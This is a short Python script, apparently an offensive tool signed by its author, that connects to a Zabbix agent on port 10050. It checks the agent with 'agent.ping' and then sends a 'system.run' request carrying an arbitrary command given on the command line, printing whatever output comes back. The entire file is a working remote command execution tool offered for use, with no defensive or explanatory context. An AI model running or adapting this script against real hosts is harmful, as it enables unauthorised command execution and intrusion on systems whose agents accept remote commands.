import sys, socket, struct, time

def ping(ip, p=10050):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, p))
        k = b'agent.ping'
        s.sendall(b'ZBXD\x01' + struct.pack('<Q', len(k)) + k)
        time.sleep(0.3)
        r = s.recv(4096)
        s.close()
        return b'1' in r
    except Exception as e:
        print(f'[-] ping error: {e}')
        return False

def run(ip, c, p=10050):
    c = c.replace('/', '\\/').replace(' ', '\\ ')
    k = f'system.run[{c}]'.encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((ip, p))
        s.sendall(b'ZBXD\x01' + struct.pack('<Q', len(k)) + k)
        time.sleep(0.5)
        parts = []
        while True:
            try:
                d = s.recv(8192)
                if not d: break
                parts.append(d)
            except: break
        s.close()
        raw = b''.join(parts)
        if raw.startswith(b'ZBXD'):
            try:
                n = struct.unpack('<Q', raw[5:13])[0]
                return raw[13:13+n].decode(errors='replace')
            except: return raw.decode(errors='replace')
        return raw.decode(errors='replace')
    except Exception as e:
        return f'[-] execution error: {e}'

def main():
    if len(sys.argv) < 3:
        print('usage: python3 zbx.py <ip> <command>')
        print('example: python3 zbx.py 127.0.0.1 id')
        sys.exit(1)

    ip = sys.argv[1]
    c = ' '.join(sys.argv[2:])

    print(f'[*] connecting to {ip}:10050...')

    if not ping(ip):
        print('[-] host is down or agent not responding')
        sys.exit(1)

    print('[+] agent alive')
    print(f'[*] running: {c}')
    out = run(ip, c)

    if out.startswith('[-]'):
        print(out)
    else:
        print('[+] output:')
        print(out if out.strip() else '[empty]')

    print('make by bibakr')

if __name__ == '__main__':
    main()